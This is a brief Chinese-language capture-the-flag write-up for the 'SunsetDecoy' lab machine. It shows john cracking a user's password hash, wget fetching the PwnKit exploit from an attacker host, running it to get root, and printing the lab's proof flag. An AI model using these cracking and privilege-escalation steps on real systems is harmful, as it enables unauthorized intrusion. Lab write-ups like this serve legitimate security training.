参考文档 ：  
[https://medium.com/@cyberarri/sunsetdecoy-pg-play-writeup-8728ae583dac](https://medium.com/@cyberarri/sunsetdecoy-pg-play-writeup-8728ae583dac)
    
解密hash  
┌──(kali㉿kali)-[~/Desktop/pg02/summ/etc]  
└─$ john --wordlist=rockyou.txt user1.unshadow  
Using default input encoding: UTF-8  
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])  
Cost 1 (iteration count) is 5000 for all loaded hashes  
Will run 6 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
server (296640a3b825115a47b68fc44501c828)  
1g 0:00:00:03 DONE (2025-10-22 03:43) 0.2617g/s 4523p/s 4523c/s 4523C/s extremo..goarmy  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.   ┌──(kali㉿kali)-[~/Desktop/pg02/summ/etc]  
└─$
   

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
 
wget [http://192.168.45.183/PwnKit](http://192.168.45.183/PwnKit)
 
--2025-10-22 03:57:44-- [http://192.168.45.183/PwnKit](http://192.168.45.183/PwnKit)  
Connecting to 192.168.45.183:80... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 18040 (18K) [application/octet-stream]  
Saving to: ‘PwnKit’
 
PwnKit 100%[========================================================================================================================================\>] 17.62K --.-KB/s in 0.1s
 
2025-10-22 03:57:44 (172 KB/s) - ‘PwnKit’ saved [18040/18040]
 
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ ls  
linpeas.sh PwnKit systemd-private-d2f3e64be70b4d178182cf3b41b910cb-apache2.service-XVZg2v systemd-private-d2f3e64be70b4d178182cf3b41b910cb-systemd-timesyncd.service-afGVUH vmware-root_414-592089511  
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ chmod +x PwnKit  
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ ./PwnKit 执行之后就是提权  
root@60832e9f188106ec5bcc4eb7709ce592:/tmp# cd  
root@60832e9f188106ec5bcc4eb7709ce592:~# ls  
chkrootkit-0.49 proof.txt root.txt script.sh  
root@60832e9f188106ec5bcc4eb7709ce592:~# cat proof.txt  
92588bddf79cfae446866f7f07f8afd9  
root@60832e9f188106ec5bcc4eb7709ce592:~#
 
注rcokyou.txt 文件的位置
 
注意 在提权的时候 没有curl命令 直接shell提权